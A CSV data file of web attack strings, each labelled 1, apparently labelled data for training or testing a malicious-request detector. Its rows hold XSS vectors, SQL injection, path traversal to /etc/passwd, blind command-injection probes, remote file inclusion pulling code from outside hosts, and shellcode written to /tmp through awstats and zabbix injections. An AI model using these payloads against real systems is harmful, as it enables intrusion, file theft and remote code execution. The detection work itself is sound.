code,status
"/eg2u8pbv.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/phpmyadmin/sawmill6cl.exe?ho+{complete_version},1
/..\\\..\\\..\\\..\\\..\\\{FILE},1
/examples/jsp/error/docs.php?doc=../jpgraph-1.12.1/docs/index,1
<svg><script onlypossibleinopera:-)> confirm(1),1
/javascript/htpasswd.sfish,1
/examples/jsp/checkbox/index.php?cid=',1
&echo LPHFGP$((58+11))$(echo LPHFGP)LPHFGP|,1
|echo SBQEFZ$((80+12))$(echo SBQEFZ)SBQEFZ\,1
/opensiteadmin/scripts/classes/fieldmanager.php?path=http://192.168.202.96:8080/frznctvhi0i5?\x00,1
'1+and+'123'='123,1
"/ap58k3ci.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/nyjgaorz.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/phpmyadmin/item.fts?href=""><script>alert(""ftgate_44002.nasl"")</script>;",1
/admin/index.php?path_to_script=http://cirt.net/rfiinc.txt??&cmd=ls,1
<svg:svg>,1
&&echo VTKJBN$((70+38))$(echo VTKJBN)VTKJBN|,1
/help.php?q='\x0duname\x09>q63353886\x09#,1
"/a0imiuf1.cfm?<meta http-equiv=set-cookie content=""testxqrn=4654"">",1
/scripts/misc/audio.php?recording=../version.inc,1
 if [ 9 -ne ${str1} ],1
/admin/news.admin.php?path_to_script=http://192.168.202.118:8080/ghl9il??&cmd=ls,1
/examples/servlets/servlet/newsdesk.cgi?t=../../../../../../etc/passwd,1
/cgi.cgi/apexec.pl?etype=odp&passurl=/category/&template=../../../../../../../../../../etc/passwd\x00.html,1
/scripts/2pwudii1mt22.pl,1
#ReByaH,1
/vjbrrppi.html?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/colors/misc/audio.php?recording=../version.inc,1
& sleep 0 && str=$(echo HSRGRG) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %7C,1
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1
/main.php?stuff=\x0auname >q18828288 #,1
/scriptsite_information/,1
/javascript/saml.exe,1
 else sleep 1,1
; str=$(echo GUASVW); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,1
 then sleep 0,1
23) AND (SELECT 5524 FROM(SELECT COUNT(*),1
/javascript/.passwd.jpg,1
/aoy7kzbh.exe,1
' or 1=1,1
"/readmore.php?config[""sipssys""]=XXpathXX",1
 if [ 1 -ne ${str1} ],1
<marquee/onstart=this['innerHTML']=unescape(location.hash);>//#<img src=x onerror=alert(document.domain)>,1
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",1
/javascript/mp3.exe,1
"/82q7ywa8.idc?<script>document.cookie=""testpwew=1315;""</script>",1
/scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331904462,1
'| [ 8 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,1
& sleep 0 && str=$(echo LBFVNS) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 #,1
<script>({set/**/$($){_/**/setter=$,1
"/""rss+security""/",1
"<isindex action=""javas&Tab;cript:confirm(document.cookie)"" type=image>",1
/cgi/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd\x00,1
/javascript/lg.exe,1
"/help.php?q=""&del q11415113 #",1
/manager/shopexd.asp?catalogid='42,1
' (select top 1,1
/javascript/jdbc.exe,1
"/o1zj4u9v.nsf?<meta http-equiv=set-cookie content=""testabrn=6368"">",1
/javascript/edits.exe,1
 if [ 4 -ne ${str1} ],1
"/yver8r9o.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,1
',1
/examples/jsp/num/contrib/forms/evaluation/c_formevaluation.class.php?fileroot=/etc/passwd\x00,1
"/help.php?q=""ping\x09-w\x097000\x09-n\x091\x091.2.3.4|rem\x09",1
"`'><script>\x09javascript:alert(1)</script>
`'><script>\xE2\x80\x89javascript:alert(1)</script>",1
/javascript/cocoon.exe,1
| [ 4 -ne $(echo TSEUFD | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,1
& sleep 0 && str=$(echo UIVPGT) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %26,1
;echo ESBMYC$((3+57))$(echo ESBMYC)ESBMYC,1
/scripting modules_information/,1
"/5qnlm5z2.cfm?<script>document.cookie=""testsixi=8451;""</script>",1
/subscriptions.sfish,1
/phpmyadmin/catalog.php?action=category_show&id=',1
/examples/servlets/servlet/webspirs.cgi?sp.nextform=../../../../../../../../../etc/passwd,1
/.../.../.../.../.../.../.../{FILE},1
"/top.php?stuff="";sleep 7 #",1
/examples/jsp/colors/news/index.dot?id=../../../../../../../../../../../..//etc/passwd\x00.jpg,1
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",1
/Script_Path/config.inc.php?_path=XXpathXX?,1
/examples/jsp/colors/mail.php?id='/**/union/**/select/**/1,1
"/u8yiqilu.aspx?<meta http-equiv=set-cookie content=""testswjp=6010"">",1
',1
/manager/index.php?cid=',1
'echo$IFSMDCMCB$((27+53))$(echo$IFSMDCMCB)MDCMCB&,1
"/examples/jsp/error/dsweb/services/user-1""><body onload=alert('xerox_docushare_dsweb_xss.nasl')>",1
/b5xdqgz2.nsf?<script>cross_site_scripting.nasl</script>,1
"?x=""",1
/cacti/adlayer.php?layerstyle=../../../../../../../etc/passwd\x00,1
/rcscript/,1
/..\..\..\..\..\../winnt/repair/sam,1
/cgi-bin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904405')</script>,1
& sleep 0 && str=$(echo HIXNBS) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 &,1
"/help.php?q=""ping",1
/login.php?srcdir=XXpathXX?,1
"/bxnyrhmh.nsf?<script>document.cookie=""testmjct=1867;""</script>",1
 then sleep 0,1
"/y8pmygrp.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/append.exe,1
/gbook/includes/header.php?abspath=XXpathXX?,1
"/ddoworrl.cgi?<meta http-equiv=set-cookie content=""testvlau=8517"">",1
truncate,1
/examples/jsp/error/pmwiki.php?globals[farmd]=/etc/passwd\x00,1
 fi %22,1
"/l13b77e5.jspa?<script>document.cookie=""testjvvf=7721;""</script>",1
 str=$(echo SHPKRI),1
"<script>document.cookie=""testcrcv=6167;""</script>",1
/examples/jsp/sessions/webspirs.cgi?sp.nextform=../../../../../../../../../etc/passwd,1
"/if69ddo1.cfm?<script>document.cookie=""testiabz=5220;""</script>",1
/jenna jameson's 1st porn video/,1
"<a href=""data:text/html;blabla",1
 then sleep 0,1
 str=$(echo YQOMCI),1
"<IMG SRC=""jav&#x09;ascript:confirm(<WBR>document.location);"">",1
-1.0,1
"| [ 2 -ne $(echo ADQAHN | tr -d '\n' | wc -c) ] || sleep 1 %7C
| [ 3 -ne $(echo ADQAHN | tr -d '\n' | wc -c) ] || sleep 1 %7C",1
 then sleep 0,1
 str=$(echo GQPJFY),1
 else sleep 1,1
"/jdx255ea.aspx?<script>document.cookie=""testziyq=5055;""</script>",1
/top.php?stuff=;sleep 9 #,1
%22,1
"/jnt3f86c.exe?<meta http-equiv=set-cookie content=""testcmax=9270"">",1
/scripts/index.php?edit=nonexistant859870284,1
echo AGIYMZ$((69+52))$(echo AGIYMZ)AGIYMZ,1
"/nyvbv05h.asp?<script>document.cookie=""testftxz=5980;""</script>",1
/indexinfo.php?bibtexrootrel=XXpathXX?,1
/scripts/gallery.scr.php?globals[pth][func]=http://cirt.net/rfiinc.txt??,1
/javascript/have.exe,1
"name:""Foo <img src=x onerror=alert(/XSS/.source)>Bar""",1
 if [ 2 -ne ${str1} ],1
/pandora's jar/,1
 if [ 3 -ne ${str1} ],1
"/help.php?q=""rm\x09q12928131\x09#",1
<script>({set/**/$($){_/**/setter=$,1
/nuh3zirz.mscgi?<script>cross_site_scripting.nasl</script>,1
/javascript/phpmyadmin.exe,1
/cfide/scripts/ajax/fckeditor/editor/filemanager/connectors/cfm/upload.cfm?command=fileupload&type=file&currentfolder=/flkzzubocd.jsp\x00,1
/examples/jsp/colors/yabb.pl?board=news&action=display&num=../../../../../../etc/passwd\x00,1
/supasite/admin_users.php?supa[db_path]=XXpathXX,1
/tamambolo_scriptprocdump/,1
"/msadm/user/login.php3?account_name=\""><script>alert('vulnerable')</script>",1
 else sleep 1,1
/examples/jsp/jsp2/el/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; ,1
/cgi-perl/apexec.pl?etype=odp&passurl=/category/&template=../../../../../../../../../../etc/passwd\x00.html,1
 fi #,1
"/vjbrrppi.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/n9xlumt5.html?<script>cross_site_scripting.nasl</script>,1
"/fmnveedu.dll?<script>document.cookie=""testgfbr=7014;""</script>",1
"/i686v90l.htm?<script>document.cookie=""testfutf=1550;""</script>",1
/top.php?stuff='|sleep 8 #,1
/examples/jsp/jsp2/jspx/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=;,1
/xfkun1ku.idc?<script>cross_site_scripting.nasl</script>,1
/en-us/account/add_url.htm?node=<script>alert('xss')</script>,1
"<object+data=""data:text/html;base64",1
"/top.php?stuff=""&del\x0bq72181135&rem\x0b",1
Bcc:<youremail>,1
/%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},1
/qb2xy9aw.kspx?<script>cross_site_scripting.nasl</script>,1
"/main.php?logout=""ping",1
"/qczkquis.x?<meta http-equiv=set-cookie content=""testkwlg=5591"">",1
/examples/jsp/checkbox/index2.cgi?frames=yes&board=demo&mode=current&threads=collapse&message=../../../../../../../../../../etc/passwd\x00,1
/phpress/adisplay.php?lang=XXpathXX,1
/addressbook.php?GLOBALS[basedir]=XXpathXX?,1
/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.96:8080/whmch8ftkt7kv?\x00,1
 else sleep 1,1
/main.php?logout=';uname >q59144751 #,1
/lib/db/mysql.class.php?root=XXpathXX,1
 else sleep 1,1
"/top.php?stuff=""ping\x0c-w\x0c9000\x0c-n\x0c1\x0c1.2.3.4|rem\x0c",1
 fi //,1
 if [ 8 -ne ${str1} ],1
 else sleep 1,1
/javascript/documents.exe,1
/elseif/utilisateurs/espaceperso.php?tpelseifportalrepertoire=XXpathXX,1
"/en-us/<img src=""javascript:alert(cross_site_scripting.nasl);"">.htm",1
 str1=${#str},1
"/5qnlm5z2.asp?<meta http-equiv=set-cookie content=""testsixi=8451"">",1
 str=$(echo NWELWC),1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=http://192.168.24.202/main.php?logout=1&frm_user=&scr_height=q43355524&scr_width=,1
&#X0003C,1
 str=$(echo MKJXCW),1
*(|(objectclass=*)),1
]>,1
/theme/breadcrumb.php?rootBase=XXpathXX?,1
 else sleep 1,1
/htbin/.htpasswd,1
/scripts/fgos1sb1c1tr.pl,1
/scripts/kernel/loadkernel.php?installpath=/etc/passwd\x00,1
/phpmyadmin/index.php?gadget=glossary&action=viewterm&term=<script>alert('jaws_xss.nasl');</script>,1
%22| [ 4 -ne $(echo EHUILY | tr -d '\n' | wc -c) ] || sleep 1 %22,1
 str=$(echo OECGFV),1
 str=$(echo IEZSHQ),1
"/1qwv2p5p.cfc?<meta http-equiv=set-cookie content=""testvqcy=252"">",1
"/y8pmygrp.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cgi-bin/docs/index.php?lang=/../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/error/nucleus/libs/pluginadmin.php?globals[dir_libs]=/etc/passwd\x00,1
/examples/servlets/servlet/faq.php?action=&type=view&s=&id=-1' union select 0,1
"/h4bi26jd.cgi?<meta http-equiv=set-cookie content=""testhrzx=1150"">",1
"/bn857frh.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/jspx/tinybrowser/upload.php?badfiles=1><script>alert('tinybrowser_multiple_xss.nasl')</script>,1
/graf engraves holbein's dance of death on knives 1521/,1
".print(`echo MFYSPW;echo $((87+75));echo MFYSPW;echo MFYSPW`);%23MFYSPW
.print(`echo DSHOEV",1
 str1=${#str},1
|echo$IFSEQEOTH$((5+24))$(echo$IFSEQEOTH)EQEOTH//,1
!,1
"/top.php?stuff=""del q61593836&rem ",1
&#X003C,1
/main.php?stuff=ver\x09>q16924512&rem\x09,1
 str=$(echo NETEBT),1
////////../../../../../../etc/passwd,1
"><style type=text/less>a{b:`function(){alert(1)}()`;}</style>
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
' or ''='
' or '1'='1
<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////dev/random"""">]><foo>&xxe;</foo>""",1
/rv98iwjp.aspx?<script>cross_site_scripting.nasl</script>,1
&echo IWRTXC$((50+84))$(echo IWRTXC)IWRTXC,1
/bin/pfdisplay.cgi?'\x0a/bin/cat /etc/passwd|',1
 if [ 1 -ne ${str1} ],1
"/g8nu2yy7.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/m2fpztty.pl?<script>cross_site_scripting.nasl</script>,1
/cgibin/webbbs/webbbs_config.pl?body=aaaaffff&email=test@example.com&followup=10;cat /etc/passwd&name=joe,1
/cgi-bin/mail.php?id='/**/union/**/select/**/1,1
<s&#x63;ri&#x70;t s&#x72;c=http://xs&#s63;.cx/xss.js></s&#x63;ri&#x70;t>,1
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../{FILE},1
/examples/jsp/jsp2/el/alienform.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd,1
 fi %5C%5C,1
),1
/eei78ore.htm?<script>cross_site_scripting.nasl</script>,1
echo YBHKVY$((91+88))$(echo YBHKVY)YBHKVY&,1
echo DAPXMM$((19+99))$(echo DAPXMM)DAPXMM\\,1
| [ 3 -ne $(echo ZDEVVW | tr -d '\n' | wc -c) ] || sleep 1 ',1
"/en-us/hipkz026.exe?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
"/jnt3f86c.htm?<meta http-equiv=set-cookie content=""testcmax=9270"">",1
/entrylevelmedicaltranscriptionistjobs/,1
/examples/jsp/cal/admin/top.php?admindir=/etc/passwd\x00,1
"<a$href=""data:text/html",1
/examples/servlets/servlet/mail.php?id='/**/union/**/select/**/1,1
/ocs/include/theme.inc.php?fullpath=XXpathXX?,1
& sleep 0 && str=$(echo FEGQZM) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 //,1
/activedirectoryremoteadminscripts/,1
/phpmyadmin/shopexd.asp?catalogid='42,1
/help.php?q='uname >q41634876 #,1
/manager/admin/p_ins.php?MGR=XXpathXX,1
/examples/jsp/error/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd,1
/javascript/jakarta.exe,1
; str=$(echo TLXEJK); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi ,1
"/<script>document.cookie=""testxllt=9940;""</script>",1
/Net_DNS_PATH/DNS/RR.php?phpdns_basedir=XXpathXX?,1
"/t578vqea.jsp?<meta http-equiv=set-cookie content=""testsory=7676"">",1
/scripts/admin/login-default.do,1
||echo$IFSXSJZOO$((37+56))$(echo$IFSXSJZOO)XSJZOO,1
"/ao22ww7y.x?<meta http-equiv=set-cookie content=""testqppc=8767"">",1
"<x data-bind="".:&#x5cu0061lert(1)"">",1
 then sleep 0,1
/javascript/request.exe,1
' echo DWDUKP$((90+61))$(echo DWDUKP)DWDUKP//,1
/don't panic/,1
 then sleep 0,1
/script/index.php?path_inc=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
 str1=${#str},1
 else sleep 1,1
"<!--#echo var=""http_user_agent"" -->",1
 if [ 5 -ne ${str1} ],1
/help.php?q=&ver >q66994514&rem ,1
echo QBALEF$((39+26))$(echo QBALEF)QBALEF&,1
 if [ 4 -ne ${str1} ],1
"/main.php?logout=""ping\x0c-w\x0c9000\x0c-n\x0c1\x0c4.3.2.1&rem\x0c",1
/cgi-local/pfdispaly.cgi?../../../../../../../../../../etc/passwd,1
 str1=${#str},1
"<form><isindex formaction=""javascript&colon;confirm(1)""",1
; str=$(echo EWCHCT); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,1
/inc/libs/core/core.process_cached_inserts.php?plugin_file=XXpathXX?,1
/member/usercp_menu.php?script_folder=http://192.168.202.118:8080/ghl9il?,1
/scripts/viewcat.asp,1
"/main.php?stuff=""\x0arm q45664393 #",1
/top.php?stuff='\x0auname\x09>q46955555\x09#,1
'& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 &,1
"<form><button formaction=""javascript:alert(1)"">X</button>",1
"/main.php?stuff=""rm",1
'&echo WHTJDF$((87+5))$(echo WHTJDF)WHTJDF|,1
 str=$(echo KEZMWT),1
"/o35zot2r.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/dslpwt15.htm?<meta http-equiv=set-cookie content=""testtkio=5454"">",1
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href=//jsfiddle.net/t846h/"">click",1
 if [ 7 -ne ${str1} ],1
"><img src=x onerror=prompt(1);>
><img src=x onerror=window.open('https://www.google.com/');>",1
/javascript/microsoft.exe,1
%27; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,1
"<iframe src=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//",1
 str=$(echo LWOKNM),1
/javascript/dialog.exe,1
;echo$IFSOZHGXS$((54+58))$(echo$IFSOZHGXS)OZHGXS\,1
"; str=$(echo GRQQCI); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27
; str=$(echo GRQQCI); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27",1
& sleep 0 && str=$(echo MISRQQ) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %7C,1
| [ 9 -ne $(echo FATRPK | tr -d '\n' | wc -c) ] || sleep 1 ,1
"/169okeyj.aspx?<meta http-equiv=set-cookie content=""testxeoi=3573"">",1
"/top.php?stuff=""ping",1
"/<meta http-equiv=set-cookie content=""testiklc=904"">",1
/static//./../../../../../../../.etc/passwd,1
"/ghswfouu.jspa?<script>document.cookie=""testsqmm=5713;""</script>",1
 if [ 1 -ne ${str1} ],1
"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
/%uff0e%uff0e/%uff0e%uff0e/{FILE},1
/scripts/simple/view_page?mv_arg=|cat /etc/passwd|,1
/examples/jsp/sessions/cgiforum.pl?thesection=../../../../../../../../etc/passwd\x00,1
 str=$(echo BXLXVP),1
/ovcgi/getnnmdata.exe,1
<input value=<><iframe/src=javascript:confirm(1),1
"
echo$IFSEIOLQJ$((69+36))$(echo$IFSEIOLQJ)EIOLQJ//
;echo$IFSXVUYIQ$((97+2))$(echo$IFSXVUYIQ)XVUYIQ//",1
<script x> alert(1) </script 1=2,1
 str1=${#str},1
"/zmvq66jy.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/inc/formmail.inc.php?script_root=XXpathXX,1
/javascript/commerce.exe,1
/scripts/tinfo.php?id=1331908818,1
/skins/phpchess/layout_admin_cfg.php?Root_Path=XXpathXX,1
"<a href=""data:text/html;base64_",1
 fi ,1
/en-us/esmozg5d.exe?<script>cross_site_scripting.nasl</script>,1
& sleep 0 && str=$(echo HMZJIQ) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 |,1
"<a target=""x"" href=""xssme?xss=<script>addEventListener(""DOMFrameContentLoaded""",1
"/help.php?q=""ver >q77224434&rem ",1
'|echo$IFSFUKEZB$((71+34))$(echo$IFSFUKEZB)FUKEZB&,1
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=odglgrw3g6v6s149n,1
/mindmeld/include/ask.inc.php?MM_GLOBALS[home]=XXpathXX?,1
"&echo$IFSVYULFC$((89+15))$(echo$IFSVYULFC)VYULFC'
|echo$IFSYOKEXI$((60+52))$(echo$IFSYOKEXI)YOKEXI'",1
"&echo EDHTTZ$((57+39))$(echo EDHTTZ)EDHTTZ""",1
"/ghswfouu.do?<script>document.cookie=""testsqmm=5713;""</script>",1
echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\,1
"/help.php?q=""&ver",1
;echo OHFUJG$((48+14))$(echo OHFUJG)OHFUJG&,1
`ping 127.0.0.1`,1
"
 str=$(echo VYCNRP)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi ",1
"|echo$IFSKEDUES$((72+2))$(echo$IFSKEDUES)KEDUES
||echo$IFSXQFITQ$((91+69))$(echo$IFSXQFITQ)XQFITQ",1
<script>alert(document.head.innerHTML.substr(146,1
/javascript/don.exe,1
/main.php?logout='&uname\x09>q79227952\x09#,1
/twistednamesinitscript/,1
',1
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",1
/scripts/qop0sa1auif9.inc,1
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908785&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
/examples/jsp/colors/edit.jsp?page=user&editor=../../../install,1
';echo$IFSTDCNYP$((73+27))$(echo$IFSTDCNYP)TDCNYP|,1
 str1=${#str},1
/javascript/dba.exe,1
"/awstats/awstats.pl?migrate=|echo;/bin/echo -en ""vj\0001j\0002\0211\0341j\0001jfx\0133\0315\0200\0222"" >> /tmp/gjehhrjnrx0;echo|awstats586722.txt",1
"/en-us/s7qus4g3.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/webtop/wdk/samples/dumprequest.jsp?j=<script>alert('vulnerable');</script>f,1
/scripts/shop.plx/page=nessus394221529,1
<button>'><img src=x onerror=confirm(0);></button>,1
"><img src=1 onerror=alert(1)>.gif
<svg xmlns=http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",1
 echo BWDHGF$((47+6))$(echo BWDHGF)BWDHGF,1
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('chmod+777+/tmp/lhmpvdjfem.sh').""]=1",1
"/tuwjta1w.dll?<meta http-equiv=set-cookie content=""testpokn=7494"">",1
/postscript/,1
"/help.php?q=""rm q98145633&rem ",1
| [ 2 -ne $(echo IZDFYZ | tr -d '\n' | wc -c) ] || sleep 1 #,1
/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE},1
/cgi-bin/fom.cgi?file=<script>alert('vulnerable')</script>,1
/javascript/templ.exe,1
"/jujgxwav.mscgi?<meta http-equiv=set-cookie content=""testknim=9383"">",1
"/mv8wxfy9.dll?<meta http-equiv=set-cookie content=""testrhbc=8184"">",1
 then sleep 0,1
/cacti/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd\x00,1
/javascript/sitemap.exe,1
& sleep 0 && str=$(echo TKDFPY) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 \\,1
 if [ 3 -ne ${str1} ],1
"/9kr0ih0v.do?<script>document.cookie=""testzgnm=1183;""</script>",1
/recordings/_head.php?_zb_path=../../../../../../../../../../etc/passwd\x00,1
/modules/newbb_plus/votepolls.php?bbPath[path]=XXpathXX,1
'; str=$(echo WSGIYR); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,1
/scripts/..\..\winnt/system32/cmd.exe?/c+dir,1
/javascript/1996.exe,1
 then sleep 0,1
; str=$(echo EEKJDE); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,1
"/fmnveedu.exe?<meta http-equiv=set-cookie content=""testgfbr=7014"">",1
/examples/jsp/cal/demos/demo.browse.php?filename=/etc/passwd,1
'.print(`echo RDHTSN`.`echo $((90+44))`.`echo RDHTSN`.`echo RDHTSN`);.'RDHTSN,1
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('/bin/echo+-en+""\0174\0044\0000\0377\0347""+>>+/tmp/pxvobegahd0;').""]=1",1
ORDER BY 10 ,1
/scripts/eezuu7xc7ge3.inc,1
/phpmyadmin/documentation.html?phpmyadmin=<?php passthru('id'); die; ?>,1
/javascript/key.exe,1
/cgi/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
"/qhvu0pdg.cgi?<meta http-equiv=set-cookie content=""testchuc=2100"">",1
/examples/jsp/jsp2/el/config.php?path[docroot]=/etc/passwd\x00,1
/examples/jsp/jsp2/jspx/search.php?submit=true&search=');,1
' and if(substring(user(),1
/examples/servlets/servlet/sojourn.cgi?cat=../../../../../etc/passwd\x00,1
${shell_exec(print(`echo BMQBVJ;echo $((82+52));echo BMQBVJ;echo BMQBVJ`);.%27BMQBVJ,1
 str1=${#str},1
 if [ 1 -ne ${str1} ],1
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}},1
||echo$IFSXECQXX$((94+39))$(echo$IFSXECQXX)XECQXX,1
/main.php?logout=|ping;-w;7000;-n;1;4.3.2.1|rem;,1
'& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %26,1
